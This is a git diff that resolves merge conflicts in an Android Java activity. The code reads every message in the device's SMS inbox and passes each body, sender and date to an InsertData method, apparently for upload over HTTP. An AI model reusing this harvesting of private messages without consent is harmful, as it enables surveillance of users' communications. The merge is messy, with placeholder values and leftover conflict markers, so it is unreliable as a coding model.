@@ -1,13 +1,12 @@
 package com.example.androiddatachecker;
 
-<<<<<<< HEAD
+
 import android.content.ContentResolver;
 import android.content.ContextWrapper;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.support.v7.app.AppCompatActivity;
-=======
 import android.Manifest;
 import android.app.Activity;
 import android.app.Application;
@@ -24,7 +23,7 @@ import android.support.v7.app.AppCompatActivity;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
 import android.widget.Toast;
->>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
+//>>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
@@ -37,13 +36,13 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 
 import java.io.IOException;
-<<<<<<< HEAD
+//<<<<<<< HEAD
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
-=======
+//=======
 import java.util.ArrayList;
->>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
+//>>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
 import java.util.List;
 
 public class SaveUserMessage extends AppCompatActivity {
@@ -66,7 +65,7 @@ public class SaveUserMessage extends AppCompatActivity {
 
                 return;
             }*/
-<<<<<<< HEAD
+//<<<<<<< HEAD
 
 
             ContentResolver contentResolver = getContentResolver();
@@ -75,13 +74,14 @@ public class SaveUserMessage extends AppCompatActivity {
             int indexAddress = smsInboxCursor.getColumnIndex("address");
             int dat = smsInboxCursor.getColumnIndex("date_sent");
         int typesms = smsInboxCursor.getColumnIndex("type");
+        String varr="non";
+        Toast.makeText(context, "Entrée dans Do", Toast.LENGTH_LONG).show();
 
             if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
             do {
-
+                varr ="oui";
                 Date date = new Date(smsInboxCursor.getLong(dat));
                 String formattedDate = new SimpleDateFormat("dd/MM/yyyy").format(date);
-
 
                 InsertData(1,
                         458,
@@ -94,37 +94,16 @@ public class SaveUserMessage extends AppCompatActivity {
                         "date",
                         "heure",
                         "actif");
-=======
-            //SaveUserMessage ctx = new SaveUserMessage(context);
-        String varr="non";
-        Toast.makeText(context, "Entrée dans Do", Toast.LENGTH_LONG).show();
 
-            ContentResolver contentResolver = context.getContentResolver();
-            Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
-            int indexBody = smsInboxCursor.getColumnIndex("body");
-            int indexAddress = smsInboxCursor.getColumnIndex("address");
-            if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
-            do {
-                varr="oui";
-                // Toast.makeText(getContextOfApplication(), "Entrée dans Do", Toast.LENGTH_LONG).show();
-
-                //InsertData(smsInboxCursor.getString(indexAddress),smsInboxCursor.getString(indexBody));
-                InsertData(1, 458, smsInboxCursor.getString(indexBody),
-                        smsInboxCursor.getString(indexAddress), "22h",
-                        "h", Integer.toString(smsInboxCursor.getColumnIndex("address")),
-                        Integer.toString(smsInboxCursor.getColumnIndex("address")), Integer.toString(smsInboxCursor.getColumnIndex("address")),
-                        "nouvelle date", "actif");
->>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
 
             } while (smsInboxCursor.moveToNext());
             smsInboxCursor.close();
             //InsertData("papa","pa@mail.com");
             //}
-<<<<<<< HEAD
 
-=======
+
             Toast.makeText(context,"on sort du do avec"+varr,Toast.LENGTH_LONG).show();
->>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
+
     }
 
         protected void InsertData ( final int id_user, final int id_message,
@@ -197,7 +176,6 @@ public class SaveUserMessage extends AppCompatActivity {
                     etat);
         }
 
-<<<<<<< HEAD
     private String TypeSms(int type) {
         switch (type) {
             case 1:
@@ -223,9 +201,4 @@ public class SaveUserMessage extends AppCompatActivity {
             //break;
         }
     }
-=======
-public  static void Afficher(){
-        //Toast.makeText(Applic,"ce ",Toast.LENGTH_LONG).show();
-}
->>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
 }
